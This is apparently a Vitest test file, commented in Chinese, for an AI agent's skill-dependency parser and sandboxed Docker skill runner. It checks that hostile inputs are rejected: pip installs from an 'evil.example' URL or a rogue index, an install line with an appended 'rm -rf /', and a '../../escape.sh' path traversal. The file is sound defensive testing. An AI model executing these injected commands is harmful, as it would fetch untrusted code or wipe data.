import { describe, it, expect, afterAll } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { skillDeps, needsRunner, hasDeps } from '../src/agent/skillDeps.js';
import { createSkillRunner, skillRunnerTool, UNAVAILABLE } from '../server/skillRunner.mjs';
import { packToFiles, parseFrontmatter, isBinaryFile } from '../src/agent/skillPacks.js';

const dirs = [];
const tmp = () => { const d = fs.mkdtempSync(path.join(os.tmpdir(), 'jarvis-skillrun-')); dirs.push(d); return d; };
afterAll(() => { for (const d of dirs) fs.rmSync(d, { recursive: true, force: true }); });

const SPORTS = { name: 'sports-skills', body: '## 安装\n```bash\npip install sports-skills\n```\n## 用法\n```bash\nsports-skills football get_scoreboard --league chn.1\n```', files: {} };

describe('技能要什么依赖', () => {
  it('从说明里的 pip / npm install 和技能文件读出依赖', () => {
    expect(skillDeps(SPORTS).python).toEqual(['sports-skills']);
    const d = skillDeps({ body: '`pip install -U requests "pandas>=2.0"`\n```\nnpm i @scope/tool lodash@4\n```', files: { 'requirements.txt': 'httpx\n', 'package.json': '{"dependencies":{"a":"1"}}' } });
    expect(d.python).toEqual(['requests', 'pandas>=2.0']);
    expect(d.node).toEqual(['@scope/tool', 'lodash@4']);
    expect(d.pythonRequirements).toBe(true);
    expect(d.nodePackage).toBe(true);
  });

  it('网址、本地路径、奇怪参数的安装命令整条不认（不把说明里的任意命令当安装执行）', () => {
    expect(skillDeps({ body: '`pip install git+https://evil.example/x.git`\n`pip install ../x`\n`pip install --index-url http://evil a`\n`pip install a; rm -rf /`' }).python).toEqual([]);
  });

  it('只有文字说明的技能不用运行器；带脚本、要装依赖、说明里要跑命令的要用', () => {
    expect(needsRunner({ body: '写作时先列提纲，再逐段写。', files: { 'ref.md': '参考' } })).toBe(false);
    expect(needsRunner({ body: '说明', files: { 'scripts/a.py': 'print(1)' } })).toBe(true);
    expect(needsRunner(SPORTS)).toBe(true);
    expect(needsRunner({ body: '运行 `python3 tools/report.py`' })).toBe(true);
    expect(hasDeps(skillDeps({ body: '纯说明' }))).toBe(false);
  });
});

/** 假的 docker：记下每次调用，按脚本返回 */
function fakeDocker({ inspectOk = true, run = () => ({ stdout: 'ok\n', stderr: '' }) } = {}) {
  const calls = [];
  const fn = async (args) => {
    calls.push(args);
    if (args[0] === 'image') { if (!inspectOk) throw new Error('No such image'); return { stdout: '[]' }; }
    if (args[0] === 'run') return run(args);
    return { stdout: '' };
  };
  return { fn, calls };
}
const envOf = (args) => args.flatMap((a, i) => (args[i - 1] === '-e' ? [a] : []));

describe('技能运行器', () => {
  it('没装运行器：照实告诉模型怎么装，不在宿主机执行', async () => {
    const d = fakeDocker({ inspectOk: false });
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: d.fn });
    const tool = skillRunnerTool({ runner, getPack: async () => SPORTS, saveFile: async () => {} });
    await expect(tool.run({ skill: 'sports-skills', command: 'sports-skills nba get_scoreboard' })).rejects.toThrow(UNAVAILABLE);
    expect(d.calls.every((a) => a[0] === 'image')).toBe(true);
  });

  it('第一次用先装依赖（国内镜像），依赖没变第二次不重装；运行时隔离、不带密钥', async () => {
    const d = fakeDocker();
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: d.fn });
    const progress = [];
    const tool = skillRunnerTool({ runner, getPack: async () => SPORTS, saveFile: async () => {} });
    process.env.SOME_SECRET_KEY = 'sk-should-not-pass';
    const out = await tool.run({ skill: 'sports-skills', command: 'sports-skills nba get_scoreboard' }, { progress: (m) => progress.push(m) });
    await tool.run({ skill: 'sports-skills', command: 'sports-skills nba get_scoreboard' });
    delete process.env.SOME_SECRET_KEY;
    const runs = d.calls.filter((a) => a[0] === 'run');
    const installs = runs.filter((a) => a.join(' ').includes('pip install'));
    expect(installs).toHaveLength(1);
    expect(installs[0].join(' ')).toContain('pypi.tuna.tsinghua.edu.cn');
    expect(installs[0].join(' ')).toContain("'sports-skills'");
    expect(progress.some((m) => /装依赖/.test(m))).toBe(true);
    const exec = runs.filter((a) => !a.join(' ').includes('pip install'));
    expect(exec).toHaveLength(2);
    for (const a of exec) {
      expect(a).toEqual(expect.arrayContaining(['--read-only', '--cap-drop=ALL', '--user=65534:65534', '--security-opt=no-new-privileges']));
      expect(a.some((x) => /^--memory=/.test(x))).toBe(true);
      expect(a.join(' ')).toMatch(/dst=\/skill,readonly/);
      expect(a.join(' ')).toMatch(/dst=\/deps,readonly/);
      expect(envOf(a)).toContain('JARVIS_CMD=sports-skills nba get_scoreboard');
      expect(envOf(a).join(' ')).not.toContain('sk-should-not-pass');
      expect(a.join(' ')).not.toMatch(/JARVIS_PASSWORD|--privileged|docker\.sock/);
    }
    expect(out).toContain('退出码：0');
    expect(out).toContain('ok');
  });

  it('技能说明里没写的包（写在仓库首页的）：模型可以指定要装，记下来以后不重装；乱写的包名不装', async () => {
    const d = fakeDocker();
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: d.fn });
    const pack = { name: 'football-data', body: '用 `sports-skills football get_daily_schedule`', files: {} };
    const tool = skillRunnerTool({ runner, getPack: async () => pack, saveFile: async () => {} });
    await tool.run({ skill: 'football-data', command: 'sports-skills football get_daily_schedule', python_packages: ['sports-skills', 'git+https://evil.example/x'] });
    await tool.run({ skill: 'football-data', command: 'sports-skills football get_daily_schedule' });
    const installs = d.calls.filter((a) => a[0] === 'run' && a.join(' ').includes('pip install'));
    expect(installs).toHaveLength(1);
    expect(installs[0].join(' ')).toContain("'sports-skills'");
    expect(installs[0].join(' ')).not.toContain('evil');
  });

  it('命令失败也把错误信息交回模型（退出码、错误输出）', async () => {
    const d = fakeDocker({ run: () => { throw Object.assign(new Error('Command failed'), { code: 2, stdout: '', stderr: 'No module named foo' }); } });
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: d.fn });
    const tool = skillRunnerTool({ runner, getPack: async () => ({ name: 'x', body: '说明', files: { 'a.py': 'import foo' } }), saveFile: async () => {} });
    const out = await tool.run({ skill: 'x', command: 'python3 a.py' });
    expect(out).toContain('退出码：2');
    expect(out).toContain('No module named foo');
  });

  it('依赖装不上：说清楚原因', async () => {
    const d = fakeDocker({ run: (a) => { if (a.join(' ').includes('pip install')) throw Object.assign(new Error('fail'), { stderr: 'Could not find a version that satisfies the requirement sports-skills' }); return { stdout: '' }; } });
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: d.fn });
    const tool = skillRunnerTool({ runner, getPack: async () => SPORTS, saveFile: async () => {} });
    await expect(tool.run({ skill: 'sports-skills', command: 'sports-skills nba get_scoreboard' })).rejects.toThrow(/依赖没装上.*Could not find/);
  });

  it('服务器上没有这个技能、或已停用：说清楚', async () => {
    const runner = createSkillRunner({ image: 'img', baseDir: tmp(), runDocker: fakeDocker().fn });
    await expect(skillRunnerTool({ runner, getPack: async () => null, saveFile: async () => {} }).run({ skill: 'nope', command: 'ls' })).rejects.toThrow(/没有技能「nope」/);
    await expect(skillRunnerTool({ runner, getPack: async () => ({ ...SPORTS, enabled: false }), saveFile: async () => {} }).run({ skill: 'sports-skills', command: 'ls' })).rejects.toThrow(/已停用/);
  });

  it('技能文件写到服务器上时不会写出技能目录（路径里的 ../ 跳过）', async () => {
    const base = tmp();
    const runner = createSkillRunner({ image: 'img', baseDir: base, runDocker: fakeDocker().fn });
    const tool = skillRunnerTool({ runner, getPack: async () => ({ name: 'evil', body: '说明', files: { '../../escape.sh': 'x', 'ok.py': 'print(1)' } }), saveFile: async () => {} });
    await tool.run({ skill: 'evil', command: 'python3 ok.py' });
    expect(fs.existsSync(path.join(base, 'evil', 'src', 'ok.py'))).toBe(true);
    expect(fs.existsSync(path.join(base, 'escape.sh'))).toBe(false);
    expect(fs.existsSync(path.join(path.dirname(base), 'escape.sh'))).toBe(false);
  });
});

describe('手机 / 电脑装好的技能传到服务器', () => {
  it('打包成文件：SKILL.md（名字、带冒号引号的描述原样保留）+ 附件；大附件只传下载地址', () => {
    const big = { binary: true, b64: 'A'.repeat(10), size: 30 * 1024 * 1024, url: 'https://x/big.pptx' };
    const files = packToFiles({ name: 'demo', description: '查比分: "实时"\n第二行', body: '正文', files: { 'a.py': 'print(1)', 'small.png': { binary: true, b64: 'AAAA', size: 3 }, 'big.pptx': big } });
    const { meta, body } = parseFrontmatter(files['SKILL.md']);
    expect(meta).toMatchObject({ name: 'demo', description: '查比分: "实时"\n第二行' });
    expect(body).toBe('正文');
    expect(files['a.py']).toBe('print(1)');
    expect(isBinaryFile(files['small.png'])).toBe(true);
    expect(files['big.pptx']).toEqual({ remote: true, url: 'https://x/big.pptx', size: big.size, binary: true });
  });
});
